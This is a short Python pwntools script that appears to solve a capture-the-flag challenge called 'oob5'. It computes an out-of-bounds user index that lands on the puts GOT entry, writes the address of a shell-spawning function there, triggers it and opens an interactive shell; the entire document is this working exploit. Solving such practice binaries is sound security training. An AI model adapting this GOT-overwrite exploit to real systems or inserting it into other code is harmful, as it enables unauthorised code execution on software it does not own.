#coding=utf-8
from pwn import *

puts = 0x600fb0
user = 0x601040
shell = 0x4007b6

#r = remote('bamboofox.cs.nctu.edu.tw', 12013)
r = process('./oob5')
r.sendlineafter('User ID: ', str((puts - user) / 8))
r.sendlineafter('Nickname: ', p64(shell))
r.sendline('0')
r.interactive()
